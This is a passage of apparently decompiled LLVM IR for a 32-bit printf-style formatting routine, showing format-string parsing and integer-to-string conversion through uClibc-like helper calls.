  %v6_805b360 = call i32 @__stdio_fwrite(i32 %v0_805b35f, i32 %v3_805b33f, i32 %arg1, i32 %v0_805b356)
  store i32 %v6_805b360, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  br label %dec_label_pc_805b8ae

dec_label_pc_805b375:                             ; preds = %entry
  %v6_805b37f = call i32 @_ppfs_prepargs(i32 %v2_805b326, i32 %arg3, i32 %v5_805b32b, i32 %v5_805b32b)
  store i32 %v6_805b37f, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_805b38c = load i32, i32* @ebx, align 4
  store i32 %v0_805b38c, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805b394

dec_label_pc_805b393:                             ; preds = %dec_label_pc_805b39a
  %v1_805b393 = add i32 %v0_805b3a2, 1
  store i32 %v1_805b393, i32* @ebx, align 4
  br label %dec_label_pc_805b394.backedge

dec_label_pc_805b394.backedge:                    ; preds = %dec_label_pc_805b393, %dec_label_pc_805b894, %dec_label_pc_805b89f
  %v1_805b39e19 = phi i32 [ %v1_805b3a6, %dec_label_pc_805b393 ], [ %v3_805b894, %dec_label_pc_805b894 ], [ %v1_805b3d2, %dec_label_pc_805b89f ]
  %v0_805b39417 = phi i32 [ %v1_805b393, %dec_label_pc_805b393 ], [ %v3_805b894, %dec_label_pc_805b894 ], [ %v1_805b89f, %dec_label_pc_805b89f ]
  %v4_805b394.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805b394

dec_label_pc_805b394:                             ; preds = %dec_label_pc_805b394.backedge, %dec_label_pc_805b375
  %v1_805b3a6 = phi i32 [ %v1_805b39e19, %dec_label_pc_805b394.backedge ], [ %v0_805b38c, %dec_label_pc_805b375 ]
  %v0_805b3a2 = phi i32 [ %v0_805b39417, %dec_label_pc_805b394.backedge ], [ %v0_805b38c, %dec_label_pc_805b375 ]
  %v4_805b394 = phi i32 [ %v4_805b394.pre, %dec_label_pc_805b394.backedge ], [ %v6_805b37f, %dec_label_pc_805b375 ]
  %v1_805b394 = inttoptr i32 %v0_805b3a2 to i8*
  %v2_805b394 = load i8, i8* %v1_805b394, align 1
  %v3_805b394 = zext i8 %v2_805b394 to i32
  %v5_805b394 = and i32 %v4_805b394, -256
  %v6_805b394 = or i32 %v3_805b394, %v5_805b394
  store i32 %v6_805b394, i32* %eax.global-to-local, align 4
  %v4_805b396 = icmp eq i8 %v2_805b394, 0
  br i1 %v4_805b396, label %dec_label_pc_805b39e, label %dec_label_pc_805b39a

dec_label_pc_805b39a:                             ; preds = %dec_label_pc_805b394
  %v10_805b39a = icmp eq i8 %v2_805b394, 37
  %v1_805b39c = icmp eq i1 %v10_805b39a, false
  br i1 %v1_805b39c, label %dec_label_pc_805b393, label %dec_label_pc_805b39e

dec_label_pc_805b39e:                             ; preds = %dec_label_pc_805b39a, %dec_label_pc_805b394
  %v2_805b39e = sub i32 %v0_805b3a2, %v1_805b3a6
  %v12_805b39e = icmp eq i32 %v2_805b39e, 0
  br i1 %v12_805b39e, label %dec_label_pc_805b3c9, label %dec_label_pc_805b3a2

dec_label_pc_805b3a2:                             ; preds = %dec_label_pc_805b39e
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_805b39e, i32* @esi, align 4
  %tmp66 = icmp slt i32 %v2_805b39e, 1
  br i1 %tmp66, label %dec_label_pc_805b3be, label %dec_label_pc_805b3ac

dec_label_pc_805b3ac:                             ; preds = %dec_label_pc_805b3a2
  %v0_805b3ac = load i32, i32* @ebp, align 4
  %v1_805b3ac = load i32, i32* @esp, align 4
  %v2_805b3ac = add i32 %v1_805b3ac, -4
  %v3_805b3ac = inttoptr i32 %v2_805b3ac to i32*
  store i32 %v0_805b3ac, i32* %v3_805b3ac, align 4
  %v1_805b3ad = add i32 %v1_805b3ac, 368
  %v2_805b3ad = inttoptr i32 %v1_805b3ad to i32*
  %v3_805b3ad = load i32, i32* %v2_805b3ad, align 4
  %v5_805b3ad = add i32 %v1_805b3ac, -8
  %v6_805b3ad = inttoptr i32 %v5_805b3ad to i32*
  store i32 %v3_805b3ad, i32* %v6_805b3ad, align 4
  %v0_805b3b4 = load i32, i32* @esi, align 4
  %v2_805b3b4 = add i32 %v1_805b3ac, -12
  %v3_805b3b4 = inttoptr i32 %v2_805b3b4 to i32*
  store i32 %v0_805b3b4, i32* %v3_805b3b4, align 4
  %v0_805b3b5 = load i32, i32* %edx.global-to-local, align 4
  %v2_805b3b5 = add i32 %v1_805b3ac, -16
  %v3_805b3b5 = inttoptr i32 %v2_805b3b5 to i32*
  store i32 %v0_805b3b5, i32* %v3_805b3b5, align 4
  %v0_805b3b6 = load i32, i32* %stack_var_-364, align 4
  %v4_805b3b6 = call i32 @__stdio_fwrite(i32 %v0_805b3b6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805b3b6, i32* %eax.global-to-local, align 4
  %v1_805b3be.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805b3be

dec_label_pc_805b3be:                             ; preds = %dec_label_pc_805b3a2, %dec_label_pc_805b3ac
  %v3_805b3c6 = phi i32 [ %v2_805b39e, %dec_label_pc_805b3a2 ], [ %v1_805b3be.pre, %dec_label_pc_805b3ac ]
  %v0_805b3be = phi i32 [ 0, %dec_label_pc_805b3a2 ], [ %v4_805b3b6, %dec_label_pc_805b3ac ]
  %v12_805b3be = icmp eq i32 %v0_805b3be, %v3_805b3c6
  %v1_805b3c0 = icmp eq i1 %v12_805b3be, false
  %v0_805b8a7.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_805b3c0, label %dec_label_pc_805b8a7, label %dec_label_pc_805b3c6

dec_label_pc_805b3c6:                             ; preds = %dec_label_pc_805b3be
  %v1_805b3c6 = inttoptr i32 %v0_805b8a7.pre.pre to i32*
  %v2_805b3c6 = load i32, i32* %v1_805b3c6, align 4
  %v4_805b3c6 = add i32 %v2_805b3c6, %v3_805b3c6
  store i32 %v4_805b3c6, i32* %v1_805b3c6, align 4
  %v0_805b3c9.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805b3c9

dec_label_pc_805b3c9:                             ; preds = %dec_label_pc_805b39e, %dec_label_pc_805b3c6
  %v0_805b89f = phi i32 [ %v0_805b3a2, %dec_label_pc_805b39e ], [ %v0_805b3c9.pre, %dec_label_pc_805b3c6 ]
  %v1_805b3c9 = inttoptr i32 %v0_805b89f to i8*
  %v2_805b3c9 = load i8, i8* %v1_805b3c9, align 1
  %v3_805b3c9 = icmp eq i8 %v2_805b3c9, 0
  br i1 %v3_805b3c9, label %dec_label_pc_805b8ae, label %dec_label_pc_805b3d2

dec_label_pc_805b3d2:                             ; preds = %dec_label_pc_805b3c9
  %v1_805b3d2 = add i32 %v0_805b89f, 1
  store i32 %v1_805b3d2, i32* %edx.global-to-local, align 4
  %v2_805b3d5 = inttoptr i32 %v1_805b3d2 to i8*
  %v3_805b3d5 = load i8, i8* %v2_805b3d5, align 1
  %v12_805b3d5 = icmp eq i8 %v3_805b3d5, 37
  br i1 %v12_805b3d5, label %dec_label_pc_805b89f, label %dec_label_pc_805b3df

dec_label_pc_805b3df:                             ; preds = %dec_label_pc_805b3d2
  %v1_805b3df = load i32, i32* @esp, align 4
  %v2_805b3df = add i32 %v1_805b3df, 16
  %v3_805b3df = inttoptr i32 %v2_805b3df to i32*
  store i32 %v1_805b3d2, i32* %v3_805b3df, align 4
  %v0_805b3e3 = load i32, i32* @esp, align 4
  %v1_805b3e3 = add i32 %v0_805b3e3, 340
  %v2_805b3e3 = inttoptr i32 %v1_805b3e3 to i32*
  store i32 0, i32* %v2_805b3e3, align 4
  %v0_805b3ee = load i32, i32* @esp, align 4
  %v1_805b3f1 = add i32 %v0_805b3ee, 16
  store i32 %v1_805b3f1, i32* @ebx, align 4
  %v2_805b3f5 = add i32 %v0_805b3ee, -16
  %v3_805b3f5 = inttoptr i32 %v2_805b3f5 to i32*
  store i32 %v1_805b3f1, i32* %v3_805b3f5, align 4
  %v0_805b3f6 = load i32, i32* %stack_var_-364, align 4
  %v1_805b3f6 = inttoptr i32 %v0_805b3f6 to i32*
  %v2_805b3f6 = call i32 @_ppfs_parsespec(i32* %v1_805b3f6)
  store i32 %v2_805b3f6, i32* %eax.global-to-local, align 4
  %v0_805b3fb = load i32, i32* @ebx, align 4
  %v1_805b3fb = load i32, i32* @esp, align 4
  %v2_805b3fb = inttoptr i32 %v1_805b3fb to i32*
  store i32 %v0_805b3fb, i32* %v2_805b3fb, align 4
  %v0_805b3fe = load i32, i32* %stack_var_-364, align 4
  %v1_805b3fe = call i32 @_ppfs_setargs(i32 %v0_805b3fe)
  store i32 %v1_805b3fe, i32* %eax.global-to-local, align 4
  %v0_805b403 = load i32, i32* @esp, align 4
  %v1_805b403 = add i32 %v0_805b403, 70
  %v2_805b403 = inttoptr i32 %v1_805b403 to i8*
  %v3_805b403 = load i8, i8* %v2_805b403, align 1
  %v4_805b403 = zext i8 %v3_805b403 to i32
  store i32 %v4_805b403, i32* @edi, align 4
  %v1_805b408 = add i32 %v0_805b403, 16
  %v1_805b40b = add i32 %v0_805b403, 56
  %v2_805b40b = inttoptr i32 %v1_805b40b to i32*
  %v3_805b40b = load i32, i32* %v2_805b40b, align 4
  %v1_805b410 = add i32 %v0_805b403, 112
  store i32 %v1_805b410, i32* %edx.global-to-local, align 4
  %tmp67 = icmp slt i32 %v3_805b40b, 1
  br i1 %tmp67, label %dec_label_pc_805b41d, label %dec_label_pc_805b416

dec_label_pc_805b416:                             ; preds = %dec_label_pc_805b3df
  %v2_805b416 = zext i8 %v3_805b403 to i32
  %v3_805b416 = mul nuw nsw i32 %v2_805b416, 12
  store i32 %v3_805b416, i32* %eax.global-to-local, align 4
  %v2_805b419 = add i32 %v0_805b403, 100
  %v3_805b419 = add i32 %v2_805b419, %v3_805b416
  store i32 %v3_805b419, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805b41d

dec_label_pc_805b41d:                             ; preds = %dec_label_pc_805b3df, %dec_label_pc_805b416
  %v0_805b42527 = phi i32 [ %v1_805b410, %dec_label_pc_805b3df ], [ %v3_805b419, %dec_label_pc_805b416 ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_805b41f = add i32 %v0_805b403, 60
  %v2_805b41f = inttoptr i32 %v1_805b41f to i32*
  %v3_805b41f = load i32, i32* %v2_805b41f, align 4
  store i32 %v3_805b41f, i32* %ecx.global-to-local, align 4
  %v2_805b43072 = sub i32 0, %v3_805b41f
  %v10_805b43075 = and i32 %v3_805b41f, %v2_805b43072
  %v11_805b43076 = icmp slt i32 %v10_805b43075, 0
  %v13_805b43077 = icmp slt i32 %v2_805b43072, 0
  %v2_805b43278 = icmp eq i1 %v13_805b43077, %v11_805b43076
  br i1 %v2_805b43278, label %dec_label_pc_805b434, label %dec_label_pc_805b425

dec_label_pc_805b425:                             ; preds = %dec_label_pc_805b41d, %dec_label_pc_805b425
  %v0_805b43482 = phi i32 [ %v0_805b434, %dec_label_pc_805b425 ], [ %v1_805b408, %dec_label_pc_805b41d ]
  %v2_805b42581 = phi i32 [ %v1_805b42f, %dec_label_pc_805b425 ], [ 0, %dec_label_pc_805b41d ]
  %v0_805b42580 = phi i32 [ %v1_805b42c, %dec_label_pc_805b425 ], [ %v0_805b42527, %dec_label_pc_805b41d ]
  %v3_805b425 = mul i32 %v2_805b42581, 4
  %v4_805b425 = add i32 %v0_805b43482, 344
  %v5_805b425 = add i32 %v4_805b425, %v3_805b425
  %v6_805b425 = inttoptr i32 %v5_805b425 to i32*
  store i32 %v0_805b42580, i32* %v6_805b425, align 4
  %v0_805b42c = load i32, i32* %edx.global-to-local, align 4
  %v1_805b42c = add i32 %v0_805b42c, 12
  store i32 %v1_805b42c, i32* %edx.global-to-local, align 4
  %v0_805b42f = load i32, i32* %eax.global-to-local, align 4
  %v1_805b42f = add i32 %v0_805b42f, 1
  store i32 %v1_805b42f, i32* %eax.global-to-local, align 4
  %v1_805b430.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_805b430 = sub i32 %v1_805b42f, %v1_805b430.pre
  %v8_805b430 = xor i32 %v1_805b42f, %v1_805b430.pre
  %v9_805b430 = xor i32 %v2_805b430, %v1_805b42f
  %v10_805b430 = and i32 %v9_805b430, %v8_805b430
  %v11_805b430 = icmp slt i32 %v10_805b430, 0
  %v13_805b430 = icmp slt i32 %v2_805b430, 0
  %v2_805b432 = icmp eq i1 %v13_805b430, %v11_805b430
  %v0_805b434 = load i32, i32* @esp, align 4
  br i1 %v2_805b432, label %dec_label_pc_805b434, label %dec_label_pc_805b425

dec_label_pc_805b434:                             ; preds = %dec_label_pc_805b425, %dec_label_pc_805b41d
  %v0_805b434.lcssa = phi i32 [ %v1_805b408, %dec_label_pc_805b41d ], [ %v0_805b434, %dec_label_pc_805b425 ]
  %v1_805b434 = add i32 %v0_805b434.lcssa, 48
  %v2_805b434 = inttoptr i32 %v1_805b434 to i32*
  %v3_805b434 = load i32, i32* %v2_805b434, align 4
  store i32 %v3_805b434, i32* @ecx, align 4
  %v1_805b438 = icmp eq i32 %v3_805b434, 0
  %v1_805b43a = icmp eq i1 %v1_805b438, false
  br i1 %v1_805b43a, label %dec_label_pc_805b462, label %dec_label_pc_805b43c

dec_label_pc_805b43c:                             ; preds = %dec_label_pc_805b434
  %v1_805b43c = inttoptr i32 %v0_805b434.lcssa to i32*
  %v2_805b43c = load i32, i32* %v1_805b43c, align 4
  store i32 %v2_805b43c, i32* %eax.global-to-local, align 4
  %v1_805b43f = ashr i32 %v2_805b43c, 31
  store i32 %v1_805b43f, i32* %edx.global-to-local, align 4
  %v2_805b440 = add i32 %v0_805b434.lcssa, -4
  %v3_805b440 = inttoptr i32 %v2_805b440 to i32*
  store i32 %v1_805b43f, i32* %v3_805b440, align 4
  %v0_805b441 = load i32, i32* %eax.global-to-local, align 4
  %v2_805b441 = add i32 %v0_805b434.lcssa, -8
  %v3_805b441 = inttoptr i32 %v2_805b441 to i32*
  store i32 %v0_805b441, i32* %v3_805b441, align 4
  %v1_805b442 = add i32 %v0_805b434.lcssa, 32
  %v2_805b442 = inttoptr i32 %v1_805b442 to i32*
  %v3_805b442 = load i32, i32* %v2_805b442, align 4
  %v1_805b446 = and i32 %v3_805b442, 3840
  store i32 %v1_805b446, i32* %eax.global-to-local, align 4
  %v2_805b44b = add i32 %v0_805b434.lcssa, -12
  %v3_805b44b = inttoptr i32 %v2_805b44b to i32*
  store i32 %v1_805b446, i32* %v3_805b44b, align 4
  %v1_805b44c = add i32 %v0_805b434.lcssa, 344
  %v2_805b44c = inttoptr i32 %v1_805b44c to i32*
  %v3_805b44c = load i32, i32* %v2_805b44c, align 4
  store i32 %v3_805b44c, i32* %eax.global-to-local, align 4
  %v1_805b453 = inttoptr i32 %v3_805b44c to i32*
  %v2_805b453 = load i32, i32* %v1_805b453, align 4
  %v4_805b453 = add i32 %v0_805b434.lcssa, -16
  %v5_805b453 = inttoptr i32 %v4_805b453 to i32*
  store i32 %v2_805b453, i32* %v5_805b453, align 4
  %v0_805b455 = call i32 @_store_inttype()
  store i32 %v0_805b455, i32* %eax.global-to-local, align 4
  %v0_805b45a = load i32, i32* @esp, align 4
  %v1_805b45a = add i32 %v0_805b45a, 16
  br label %dec_label_pc_805b894

dec_label_pc_805b462:                             ; preds = %dec_label_pc_805b434
  %tmp85 = icmp ult i32 %v3_805b434, 8
  br i1 %tmp85, label %dec_label_pc_805b46b, label %dec_label_pc_805b5cc

dec_label_pc_805b46b:                             ; preds = %dec_label_pc_805b462
  %v1_805b46b = add i32 %v3_805b434, 134663140
  %v2_805b46b = inttoptr i32 %v1_805b46b to i8*
  %v3_805b46b = load i8, i8* %v2_805b46b, align 1
  %v4_805b46b = sext i8 %v3_805b46b to i32
  store i32 %v4_805b46b, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_805b477 = icmp eq i8 %v3_805b46b, 10
  %v1_805b47a = icmp eq i1 %v9_805b477, false
  br i1 %v1_805b47a, label %dec_label_pc_805b498, label %dec_label_pc_805b47c

dec_label_pc_805b47c:                             ; preds = %dec_label_pc_805b46b
  %v1_805b47c = add i32 %v0_805b434.lcssa, 32
  %v2_805b47c = inttoptr i32 %v1_805b47c to i32*
  %v3_805b47c = load i32, i32* %v2_805b47c, align 4
  %v1_805b482 = and i32 %v3_805b47c, 32
  store i32 %v1_805b482, i32* %eax.global-to-local, align 4
  %tmp68 = udiv i32 %v1_805b482, 32
  %tmp69 = sub nsw i32 45, %tmp68
  store i32 %tmp69, i32* @ebx, align 4
  %v1_805b490 = trunc i32 %v3_805b47c to i8
  %v2_805b490 = and i8 %v1_805b490, 64
  %v3_805b490 = icmp eq i8 %v2_805b490, 0
  %v5_805b490 = zext i8 %v2_805b490 to i32
  %v7_805b490 = and i32 %v3_805b47c, -256
  %v8_805b490 = or i32 %v5_805b490, %v7_805b490
  store i32 %v8_805b490, i32* %edx.global-to-local, align 4
  br i1 %v3_805b490, label %dec_label_pc_805b498, label %dec_label_pc_805b495

dec_label_pc_805b495:                             ; preds = %dec_label_pc_805b47c
  %v2_805b495 = or i32 %tmp69, 128
  store i32 %v2_805b495, i32* @ebx, align 4
  br label %dec_label_pc_805b498

dec_label_pc_805b498:                             ; preds = %dec_label_pc_805b47c, %dec_label_pc_805b46b, %dec_label_pc_805b495
  %tmp86 = icmp ult i32 %v3_805b434, 6
  br i1 %tmp86, label %dec_label_pc_805b49d, label %dec_label_pc_805b4b5

dec_label_pc_805b49d:                             ; preds = %dec_label_pc_805b498
  %v9_805b49d = icmp eq i32 %v3_805b434, 3
  %v1_805b4a0 = icmp eq i1 %v9_805b49d, false
  br i1 %v1_805b4a0, label %dec_label_pc_805b4a9, label %dec_label_pc_805b4a2

dec_label_pc_805b4a2:                             ; preds = %dec_label_pc_805b49d
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_805b4b7

dec_label_pc_805b4a9:                             ; preds = %dec_label_pc_805b49d
  %v9_805b4ae = icmp eq i32 %v3_805b434, 1
  br i1 %v9_805b4ae, label %dec_label_pc_805b4bc, label %dec_label_pc_805b4b7

dec_label_pc_805b4b5:                             ; preds = %dec_label_pc_805b498
  %v1_805b4b5 = sub nsw i32 0, %v4_805b46b
  store i32 %v1_805b4b5, i32* @esi, align 4
  br label %dec_label_pc_805b4b7

dec_label_pc_805b4b7:                             ; preds = %dec_label_pc_805b4a9, %dec_label_pc_805b4a2, %dec_label_pc_805b4b5
  br label %dec_label_pc_805b4bc

dec_label_pc_805b4bc:                             ; preds = %dec_label_pc_805b4a9, %dec_label_pc_805b4b7
  %storemerge96 = phi i32 [ 11, %dec_label_pc_805b4b7 ], [ 6, %dec_label_pc_805b4a9 ]
  store i32 %storemerge96, i32* @ebp, align 4
  %v1_805b4bc = add i32 %v0_805b434.lcssa, 7
  %v2_805b4bc = inttoptr i32 %v1_805b4bc to i8*
  store i8 32, i8* %v2_805b4bc, align 1
  %v0_805b4c1 = load i32, i32* @esp, align 4
  %v1_805b4c1 = add i32 %v0_805b4c1, 20
  %v2_805b4c1 = inttoptr i32 %v1_805b4c1 to i32*
  %v3_805b4c1 = load i32, i32* %v2_805b4c1, align 4
  %v5_805b4c1 = icmp slt i32 %v3_805b4c1, 0
  %v1_805b4c6 = icmp eq i1 %v5_805b4c1, false
  br i1 %v1_805b4c6, label %dec_label_pc_805b4d0, label %dec_label_pc_805b4c8

dec_label_pc_805b4c8:                             ; preds = %dec_label_pc_805b4bc
  %v1_805b4c8 = add i32 %v0_805b4c1, 36
  %v2_805b4c8 = inttoptr i32 %v1_805b4c8 to i8*
  %v3_805b4c8 = load i8, i8* %v2_805b4c8, align 1
  %v4_805b4c8 = zext i8 %v3_805b4c8 to i32
  %v5_805b4c8 = load i32, i32* %edx.global-to-local, align 4
  %v6_805b4c8 = and i32 %v5_805b4c8, -256
  %v7_805b4c8 = or i32 %v6_805b4c8, %v4_805b4c8
  store i32 %v7_805b4c8, i32* %edx.global-to-local, align 4
  %v3_805b4cc = add i32 %v0_805b4c1, 7
  %v4_805b4cc = inttoptr i32 %v3_805b4cc to i8*
  store i8 %v3_805b4c8, i8* %v4_805b4cc, align 1
  %v0_805b4d0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805b4d0

dec_label_pc_805b4d0:                             ; preds = %dec_label_pc_805b4bc, %dec_label_pc_805b4c8
  %v1_805b4e9 = phi i32 [ %v0_805b4c1, %dec_label_pc_805b4bc ], [ %v0_805b4d0.pre, %dec_label_pc_805b4c8 ]
  %v1_805b4d0 = add i32 %v1_805b4e9, 344
  %v2_805b4d0 = inttoptr i32 %v1_805b4d0 to i32*
  %v3_805b4d0 = load i32, i32* %v2_805b4d0, align 4
  store i32 %v3_805b4d0, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v1_805b4dc = add i32 %v3_805b434, -1
  %v8_805b4dc = icmp eq i32 %v1_805b4dc, 0
  store i32 %v1_805b4dc, i32* %ecx.global-to-local, align 4
  %v0_805b4e9.pre = load i32, i32* @edi, align 4
  br i1 %v8_805b4dc, label %dec_label_pc_805b4e9, label %dec_label_pc_805b4df

dec_label_pc_805b4df:                             ; preds = %dec_label_pc_805b4d0
  %v2_805b4df = mul i32 %v0_805b4e9.pre, 4
  %v3_805b4df = add i32 %v1_805b4e9, 52
  %v4_805b4df = add i32 %v3_805b4df, %v2_805b4df
  %v5_805b4df = inttoptr i32 %v4_805b4df to i32*
  %v6_805b4df = load i32, i32* %v5_805b4df, align 4
  %v1_805b4e3 = and i32 %v6_805b4df, 3840
  store i32 %v1_805b4e3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805b4e9

dec_label_pc_805b4e9:                             ; preds = %dec_label_pc_805b4d0, %dec_label_pc_805b4df
  %v2_805b4e9 = add i32 %v1_805b4e9, -4
  %v3_805b4e9 = inttoptr i32 %v2_805b4e9 to i32*
  store i32 %v0_805b4e9.pre, i32* %v3_805b4e9, align 4
  %v0_805b4ea = load i32, i32* @esi, align 4
  %v2_805b4ea = add i32 %v1_805b4e9, -8
  %v3_805b4ea = inttoptr i32 %v2_805b4ea to i32*
  store i32 %v0_805b4ea, i32* %v3_805b4ea, align 4
  %v0_805b4eb = load i32, i32* %eax.global-to-local, align 4
  %v2_805b4eb = add i32 %v1_805b4e9, -12
  %v3_805b4eb = inttoptr i32 %v2_805b4eb to i32*
  store i32 %v0_805b4eb, i32* %v3_805b4eb, align 4
  %v0_805b4ec = load i32, i32* %edx.global-to-local, align 4
  %v2_805b4ec = add i32 %v1_805b4e9, -16
  %v3_805b4ec = inttoptr i32 %v2_805b4ec to i32*
  store i32 %v0_805b4ec, i32* %v3_805b4ec, align 4
  %v0_805b4ed = call i32 @_load_inttype()
  %v0_805b4f2 = load i32, i32* @ebx, align 4
  %v1_805b4f2 = load i32, i32* @esp, align 4
  %v2_805b4f2 = inttoptr i32 %v1_805b4f2 to i32*
  store i32 %v0_805b4f2, i32* %v2_805b4f2, align 4
  %v0_805b4f5 = load i32, i32* @esi, align 4
  %v1_805b4f5 = load i32, i32* @esp, align 4
  %v2_805b4f5 = add i32 %v1_805b4f5, -4
  %v3_805b4f5 = inttoptr i32 %v2_805b4f5 to i32*
  store i32 %v0_805b4f5, i32* %v3_805b4f5, align 4
  %v0_805b4f6 = load i32, i32* @edx, align 4
  %v2_805b4f6 = add i32 %v1_805b4f5, -8
  %v3_805b4f6 = inttoptr i32 %v2_805b4f6 to i32*
  store i32 %v0_805b4f6, i32* %v3_805b4f6, align 4
  %v2_805b4f7 = add i32 %v1_805b4f5, -12
  %v3_805b4f7 = inttoptr i32 %v2_805b4f7 to i32*
  store i32 %v0_805b4ed, i32* %v3_805b4f7, align 4
  %v1_805b4f8 = add i32 %v1_805b4f5, 347
  store i32 %v1_805b4f8, i32* %eax.global-to-local, align 4
  %v2_805b4ff = add i32 %v1_805b4f5, -16
  %v3_805b4ff = inttoptr i32 %v2_805b4ff to i32*
  store i32 %v1_805b4f8, i32* %v3_805b4ff, align 4
  %v0_805b500 = load i32, i32* %stack_var_-364, align 4
  %v5_805b500 = inttoptr i32 %v0_805b500 to i8*
  %v6_805b500 = call i32 @_uintmaxtostr(i8* %v5_805b500, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_805b500, i32* %eax.global-to-local, align 4
  %v0_805b505 = load i32, i32* @esp, align 4
  %v1_805b505 = add i32 %v0_805b505, 32
  store i32 %v6_805b500, i32* @edi, align 4
  %v1_805b50a = add i32 %v0_805b505, 80
  %v2_805b50a = inttoptr i32 %v1_805b50a to i32*
  %v3_805b50a = load i32, i32* %v2_805b50a, align 4
  %tmp87 = icmp ult i32 %v3_805b50a, 6
  br i1 %tmp87, label %dec_label_pc_805b538, label %dec_label_pc_805b511

dec_label_pc_805b511:                             ; preds = %dec_label_pc_805b4e9
  %v1_805b511 = inttoptr i32 %v6_805b500 to i8*
  %v2_805b511 = load i8, i8* %v1_805b511, align 1
  %v11_805b511 = icmp eq i8 %v2_805b511, 45
  %v1_805b514 = icmp eq i1 %v11_805b511, false
  %v1_805b523 = add i32 %v0_805b505, 64
  %v2_805b523 = inttoptr i32 %v1_805b523 to i32*
  %v3_805b523 = load i32, i32* %v2_805b523, align 4
  br i1 %v1_805b514, label %dec_label_pc_805b523, label %dec_label_pc_805b516

dec_label_pc_805b516:                             ; preds = %dec_label_pc_805b511
  %v4_805b516 = or i32 %v3_805b523, 2
  store i32 %v4_805b516, i32* %v2_805b523, align 4
  %v0_805b51b = load i32, i32* @edi, align 4
  %v1_805b51b = add i32 %v0_805b51b, 1
  store i32 %v1_805b51b, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_805b538.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805b538

dec_label_pc_805b523:                             ; preds = %dec_label_pc_805b511
  store i32 %v3_805b523, i32* %eax.global-to-local, align 4
  %v2_805b527 = and i32 %v3_805b523, 2
  %v3_805b527 = icmp eq i32 %v2_805b527, 0
  br i1 %v3_805b527, label %dec_label_pc_805b52f, label %dec_label_pc_805b52b

dec_label_pc_805b52b:                             ; preds = %dec_label_pc_805b523
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_805b538

dec_label_pc_805b52f:                             ; preds = %dec_label_pc_805b523
  %v2_805b52f = urem i32 %v3_805b523, 2
  %v3_805b52f = icmp eq i32 %v2_805b52f, 0
  br i1 %v3_805b52f, label %dec_label_pc_805b538, label %dec_label_pc_805b533

dec_label_pc_805b533:                             ; preds = %dec_label_pc_805b52f
  store i32 4, i32* @ebp, align 4
  br label %dec_label_pc_805b538

dec_label_pc_805b538:                             ; preds = %dec_label_pc_805b52f, %dec_label_pc_805b4e9, %dec_label_pc_805b52b, %dec_label_pc_805b516, %dec_label_pc_805b533
  %v0_805b58b = phi i32 [ %v6_805b500, %dec_label_pc_805b52f ], [ %v6_805b500, %dec_label_pc_805b4e9 ], [ %v6_805b500, %dec_label_pc_805b52b ], [ %v1_805b51b, %dec_label_pc_805b516 ], [ %v6_805b500, %dec_label_pc_805b533 ]
  %v0_805b59a = phi i32 [ %v1_805b505, %dec_label_pc_805b52f ], [ %v1_805b505, %dec_label_pc_805b4e9 ], [ %v1_805b505, %dec_label_pc_805b52b ], [ %v0_805b538.pre, %dec_label_pc_805b516 ], [ %v1_805b505, %dec_label_pc_805b533 ]
  %v1_805b538 = add i32 %v0_805b59a, 204
  store i32 %v1_805b538, i32* %ecx.global-to-local, align 4
  %v1_805b53f = add i32 %v0_805b59a, 20
  %v2_805b53f = inttoptr i32 %v1_805b53f to i32*
  %v3_805b53f = load i32, i32* %v2_805b53f, align 4
  store i32 %v3_805b53f, i32* %edx.global-to-local, align 4
  %v2_805b543 = sub i32 %v1_805b538, %v0_805b58b
  store i32 %v2_805b543, i32* %ecx.global-to-local, align 4
  %v2_805b545 = icmp slt i32 %v3_805b53f, 0
  %v1_805b547 = add i32 %v2_805b543, 127
  store i32 %v1_805b547, i32* @esi, align 4
  %v1_805b54a = icmp eq i1 %v2_805b545, false
  br i1 %v1_805b54a, label %dec_label_pc_805b551, label %dec_label_pc_805b54c

dec_label_pc_805b54c:                             ; preds = %dec_label_pc_805b538
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805b551

dec_label_pc_805b551:                             ; preds = %dec_label_pc_805b538, %dec_label_pc_805b54c
  %v0_805b577 = phi i32 [ %v3_805b53f, %dec_label_pc_805b538 ], [ 1, %dec_label_pc_805b54c ]
  %v1_805b551 = add i32 %v0_805b59a, 32
  %v2_805b551 = inttoptr i32 %v1_805b551 to i8*
  %v3_805b551 = load i8, i8* %v2_805b551, align 1
  %v4_805b551 = and i8 %v3_805b551, 16
  %v5_805b551 = icmp eq i8 %v4_805b551, 0
  br i1 %v5_805b551, label %dec_label_pc_805b58b, label %dec_label_pc_805b558

dec_label_pc_805b558:                             ; preds = %dec_label_pc_805b551
  %v1_805b558 = add i32 %v0_805b59a, 48
  %v2_805b558 = inttoptr i32 %v1_805b558 to i32*
  %v3_805b558 = load i32, i32* %v2_805b558, align 4
  store i32 %v3_805b558, i32* %eax.global-to-local, align 4
  %tmp88 = icmp ult i32 %v3_805b558, 3
  br i1 %tmp88, label %dec_label_pc_805b561, label %dec_label_pc_805b566

dec_label_pc_805b561:                             ; preds = %dec_label_pc_805b558
  store i32 6, i32* @ebp, align 4
  br label %dec_label_pc_805b566

dec_label_pc_805b566:                             ; preds = %dec_label_pc_805b558, %dec_label_pc_805b561
